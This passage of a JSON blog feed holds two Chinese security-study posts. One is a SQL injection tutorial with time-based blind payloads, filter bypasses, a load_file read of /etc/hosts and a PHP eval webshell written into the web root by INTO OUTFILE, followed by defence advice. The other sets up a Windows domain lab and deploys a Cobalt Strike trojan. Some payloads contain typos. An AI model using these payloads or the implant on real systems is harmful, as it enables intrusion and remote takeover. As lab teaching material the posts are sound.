是睡眠函数，可以使得查询数据的时候回显数据的响应时间延长，使用方法 sleep (N) 这里 N 是延长的时间，常配合 if 使用：&lt;br /&gt;if (ascll (subster (user (),1,1))=114,sleep (5),2)&lt;br /&gt; 这样绕过 user 的第一位的 ascll 为 114 则页面返回时间延迟 5 秒</td>\n</tr>\n<tr>\n<td>benchmark()</td>\n<td>benchmark 函数原本是用来重复执行某条语句的函数，我们可以利用这个函数来测试数据库的读写性能使用方法：&lt;br /&gt;benchmark (N，expression)&lt;br /&gt; 其中 N 为执行次数，expression 为表达式。如果需要进行盲注，我们通常遇需要运算时间的计算配合使用比如 MD5</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"二次注入-2\"><a class=\"anchor\" href=\"#二次注入-2\">#</a> 二次注入</h2>\n<p>二次注入的成因是第一次入库时经过了一些转义，但是存入数据库后会去除转义，导致第二次使用时恶意构造 sql 语句</p>\n<h2 id=\"limit之后的注入\"><a class=\"anchor\" href=\"#limit之后的注入\">#</a> limit 之后的注入</h2>\n<p>mysql 数据库 &gt; 5.0、mysql 数据库 &lt; 5.6.6 可以在 limit 部分进行注入</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">select field from table where id &gt; 0 order by id limit &#123;injection_point&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>也可以使用如下的 payload 进行注入：</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">select firld from user where id &gt; 0 order by id limit 1,1 procedure analyse(extractractvalue(rand(),concat(0x3a,version())),1);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h2 id=\"注入点的发现\"><a class=\"anchor\" href=\"#注入点的发现\">#</a> 注入点的发现</h2>\n<h3 id=\"常见的注入点\"><a class=\"anchor\" href=\"#常见的注入点\">#</a> 常见的注入点</h3>\n<ol>\n<li>GET 参数</li>\n<li>POST 参数</li>\n<li>UA 头</li>\n<li>Cookie</li>\n</ol>\n<h3 id=\"判断注入点存在\"><a class=\"anchor\" href=\"#判断注入点存在\">#</a> 判断注入点存在</h3>\n<ol>\n<li>插入单引号</li>\n<li>数字型判断</li>\n<li>通过数字的加减判断</li>\n</ol>\n<h2 id=\"绕过\"><a class=\"anchor\" href=\"#绕过\">#</a> 绕过</h2>\n<h3 id=\"过滤关键字\"><a class=\"anchor\" href=\"#过滤关键字\">#</a> 过滤关键字</h3>\n<ol>\n<li>\n<p>大小写</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221008001157452.png\" alt=\"image-20221008001157452\" /></p>\n</li>\n<li>\n<p>双写（替换为空时使用）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221008001212446.png\" alt=\"image-20221008001212446\" /></p>\n</li>\n<li>\n<p>16 进制绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221008001254934.png\" alt=\"image-20221008001254934\" /></p>\n</li>\n<li>\n<p>url 编码绕过（必要时可以通过双重 url 编码饶过）</p>\n</li>\n</ol>\n<h3 id=\"过滤空格\"><a class=\"anchor\" href=\"#过滤空格\">#</a> 过滤空格</h3>\n<ol>\n<li>通过注释符绕过\n<ul>\n<li>\n<h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h1>\n</li>\n</ul>\n<hr />\n<ul>\n<li>//</li>\n<li>/**/</li>\n<li>;%00</li>\n</ul>\n</li>\n<li>url 编码（双重）</li>\n<li>换行绕过</li>\n<li>特殊符号（引号）</li>\n</ol>\n<h3 id=\"过滤单引号\"><a class=\"anchor\" href=\"#过滤单引号\">#</a> 过滤单引号</h3>\n<p>这里是指魔术引号，可以通过宽字节绕过</p>\n<h2 id=\"sql读写文件\"><a class=\"anchor\" href=\"#sql读写文件\">#</a> sql 读写文件</h2>\n<p>在 mysql 用户拥有 file 权限的时候可以使用 load_file 和 into outfile/dumpfile 进行读写</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">eg：有sql语句\nselect username from user id&#x3D;$id\n我们可以构建度文件\n?id&#x3D;-1 union select load_file(&#39;&#x2F;ect&#x2F;hosts&#39;)\n如果有单引号过滤，还可以对文件名十六进制\n?id&#x3D;-1 union select load_file(0x2f6563742f686f737473)\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>也可以写文件</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token string\">'&lt;?php eval($_post[1]);?>'</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'/var/www/html/shell.php'</span>\n或者\n?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> unhex<span class=\"token punctuation\">(</span>一句话的<span class=\"token number\">16</span>进制<span class=\"token punctuation\">)</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'/var/www/html/shell.php'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"sql注入的防御\"><a class=\"anchor\" href=\"#sql注入的防御\">#</a> sql 注入的防御</h2>\n<p>对于一个信安的学生来讲，学习这些我们最终的目的是为了防止 sql 漏洞被利用，那么就不得不提到怎么去防御 sql 注入</p>\n<p>首先我们要明确这样一个概念，数据库只做了执行 sql 语句的作用，对于数据库本身来说没有什么办法来防止 sql 注入，那么我们应该从操纵数据库的语言着手</p>\n<p>防御方法主要分为两种</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">数据类型判断和特殊字符的转义<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h3 id=\"严格的数据类型\"><a class=\"anchor\" href=\"#严格的数据类型\">#</a> 严格的数据类型</h3>\n<p>如 java 和 C# 这种强类型的语言几乎不用考虑数字型注入，如果对传入的参数进行一次数据类型的转化，当传入一个字符串时就会返回 Exception 而不会执行 sql 语句</p>\n<p>如果再 php 或者 ASP 这种没有强制要求处理数据类型的语言，当传入一个参数时会自动根据参数推导出数据类型，假设 id=1，则推导出数据类型为 Integer、id=str，则推导出 ID 的数据类型为 string</p>\n<p>防御数字型的注入相对来说要简单，只要在程序中进行数据类型的判断即可</p>\n<h3 id=\"特殊字符转义\"><a class=\"anchor\" href=\"#特殊字符转义\">#</a> 特殊字符转义</h3>\n<p>通过加强数据类型验证可以解决数字型的 SQL 注入，但是字符型的 SQL 注入却不行因为字符型就是 string 类型的，所以就无法判断输入是否是恶意攻击，那么最好的办法就是对特殊字符进行转义，在查询任意字符都需要单引号，我们可以通过闭合单引号来防御 sql 注入</p>\n",
            "tags": [
                "Web",
                "SQL注入"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E6%90%AD%E5%BB%BA/",
            "url": "https://blog.xcu.icu/2022/10/24/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E6%90%AD%E5%BB%BA/",
            "title": "域环境基础和搭建",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<p>[TOC]</p>\n<h2 id=\"内网渗透的流程概述\"><a class=\"anchor\" href=\"#内网渗透的流程概述\">#</a> 内网渗透的流程概述</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907123946766.png\" alt=\"\" /></p>\n<p>内网渗透攻击的是一个内网内的所有机器</p>\n<p>目的：控制内网内的所有机器</p>\n<p>前提：已经控制了内网里的一台机器</p>\n<h2 id=\"什么是工作域和组\"><a class=\"anchor\" href=\"#什么是工作域和组\">#</a> 什么是工作域和组</h2>\n<p>工作组：工作组是局域网中的一一个概念。它是最常见最简单最普通的资源管理模式，就是将<br />\n不同的电脑按功能分别列入不同的组中，以方便管理</p>\n<p>域: Windows 域是计算机网络的一种形式，其中所有用户帐户，计算机，打印机和其他安全<br />\n主体都在位于称为域控制器的一 - 个或多个中央计算机集群上的中央数据库中注册。身份验证<br />\n在域控制器上进行。在域中使用计算机的每个人都会收到一个唯一的用户帐户， 然后可以为<br />\n该帐户分配对该域内资源的访问权限</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907124937328.png\" alt=\"\" /></p>\n<p>工作组的缺点：</p>\n<ul>\n<li>缺乏集中管理与控制的机制</li>\n<li>没用集中的统一账户管理</li>\n<li>只适合小规模用户的使用</li>\n</ul>\n<p>控制所有主机的媒介就是找到域控</p>\n<h2 id=\"搭建域环境\"><a class=\"anchor\" href=\"#搭建域环境\">#</a> 搭建域环境</h2>\n<p>实验环境</p>\n<ul>\n<li>域控 Windows server 2012</li>\n<li>域内主机 Windows server 2008</li>\n<li>攻击机 kali</li>\n</ul>\n<p>先登录域控服务器</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907130458478.png\" alt=\"\" /></p>\n<h3 id=\"1-设置服务器\"><a class=\"anchor\" href=\"#1-设置服务器\">#</a> 1、设置服务器</h3>\n<p>在域控服务器中配置 ip 地址（注意：这里 DNS 要与 IP 地址相同，防止找不到域）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907131025908.png\" alt=\"\" /></p>\n<h3 id=\"2-更改域控服务器的主机名\"><a class=\"anchor\" href=\"#2-更改域控服务器的主机名\">#</a> 2、更改域控服务器的主机名</h3>\n<p>将域控主机名改为 DC（do man controller）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907134746980.png\" alt=\"\" /></p>\n<p>改完名之后等待域控服务器重启</p>\n<h3 id=\"3-安装域控制器和dns服务\"><a class=\"anchor\" href=\"#3-安装域控制器和dns服务\">#</a> 3、安装域控制器和 DNS 服务</h3>\n<p>接下来在域控服务器上面安装域控制器和 DNS 服务</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135517911.png\" alt=\"\" /></p>\n<p>前面的无脑下一步就行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135603793.png\" alt=\"\" /></p>\n<p>这个地方勾选基于角色功能的安装，无脑下一步</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135758204.png\" alt=\"\" /></p>\n<p>这个地方安装域控制器和 DNS 服务</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135857104.png\" alt=\"\" /></p>\n<p>等待安装完成</p>\n<p>在服务器管理页面点击黄旗</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140153956.png\" alt=\"\" /></p>\n<p>现在还没升级成为域控</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140250376.png\" alt=\"\" /></p>\n<p>升级</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140436007.png\" alt=\"\" /></p>\n<p>这里选择添加新林，就是给域控服务器一个名字</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140531418.png\" alt=\"\" /></p>\n<p>这里的跟域名要根据常见域名格式，接着无脑下一步</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140814473.png\" alt=\"\" /></p>\n<p>这个地方的密码随便设置就行，影响不大，用不上，一波无脑下一步</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140937411.png\" alt=\"\" /></p>\n<p>这个地方会检查服务器是否满足升级为域控的先决条件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907141053115.png\" alt=\"\" /></p>\n<p>检查通过后点击安装，经过重启后域控服务器调试完毕</p>\n<h3 id=\"4-域内主机加入域\"><a class=\"anchor\" href=\"#4-域内主机加入域\">#</a> 4、域内主机加入域</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907142503472.png\" alt=\"\" /></p>\n<p>先查看 2008 的 ip 看是否能联网</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907142214395.png\" alt=\"\" /></p>\n<p>这里要将 DNS 服务器地址改为域控服务器的 ip 地址</p>\n<p>接下来改主机名加入域</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907142736819.png\" alt=\"\" /></p>\n<p>在跳出的弹窗中输入域控服务器的用户名和密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907143008660.png\" alt=\"\" /></p>\n<p>回车后会弹出成功加入的弹窗</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907143217220.png\" alt=\"\" /></p>\n<p>成功入狱（狗头保命）</p>\n<h2 id=\"活动目录ad的作用\"><a class=\"anchor\" href=\"#活动目录ad的作用\">#</a> 活动目录 AD 的作用</h2>\n<p>可以理解为域控上面的数据库，在里面添加用户才能登录</p>\n<p>打开域控服务器找到 Action Directory 用户和计算机</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144119881.png\" alt=\"\" /></p>\n<p>这里添加一个用户</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144450484.png\" alt=\"\" /></p>\n<p>设置密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144504724.png\" alt=\"\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144539400.png\" alt=\"\" /></p>\n<p>使用 2008 成功登录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907145139200.png\" alt=\"\" /></p>\n<h2 id=\"使用cobalt-strike远控电脑\"><a class=\"anchor\" href=\"#使用cobalt-strike远控电脑\">#</a> 使用 Cobalt Strike 远控电脑</h2>\n<p>把 cs 文件导入攻击机</p>\n<p>进入目录使用命令 sudo bash teamserver 【kali 的 ip】 密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907153453234.png\" alt=\"\" /></p>\n<p>再开一个端口运行 bash cobaltsrike .sh</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907153739520.png\" alt=\"\" /></p>\n<p>在弹窗中输入 kali 的 ip</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907153947445.png\" alt=\"\" /></p>\n<p>成功进入 cs</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154002888.png\" alt=\"\" /></p>\n<p>先开一个监听</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154214414.png\" alt=\"\" /></p>\n<p>点击 add</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154343665.png\" alt=\"\" /></p>\n<p>输入对应的 ip 和端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154621003.png\" alt=\"\" /></p>\n<p>开始生成木马</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154714949.png\" alt=\"\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154830575.png\" alt=\"\" /></p>\n<p>使用 python3 起一个 web 环境</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907155034157.png\" alt=\"\" /></p>\n<p>这里要关闭防火墙</p>\n<p><pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">先安装\nsudo apt-get install ufw\n\n检查防火墙的状态（默认 inactive） # ufw status\n防火墙版本 # ufw version\n启动ufw防火墙 # ufw enable\n关闭ufw防火墙 # ufw disable\n默认禁止访问所有 # ufw default deny\n开放22/TCP端口 # ufw allow 22/tcp\n开放53端口(tcp/udp) # ufw allow 53\n禁止外部访问 # ufw deny 3306\n删除已经添加过的规则 # ufw delete allow 22\n允许此IP访问所有的本机端口 # ufw allow from 192.168.1.100\n删除上面的规则 # ufw delete allow from 192.168.1.100\n查看规则，显示行号 # ufw status numbered\n删除第三条规则 # ufw delete 3\n关闭ufw # ufw disable\n禁止对8888端口的访问 # ufw deny 8888\n打开来自192.168.0.1的tcp请求的22端口 # ufw allow proto tcp from 192.168.0.1 to any port 22<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907204556037.png\" alt=\"image-20220907204556037\" /></p>\n<p>将文件下载下来，然后运行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907204632334.png\" alt=\"image-20220907204632334\" /></p>\n<p>攻击机上成功上线</p>\n",
            "tags": [
                "内网",
                "域环境"
            ]
        }
    ]
}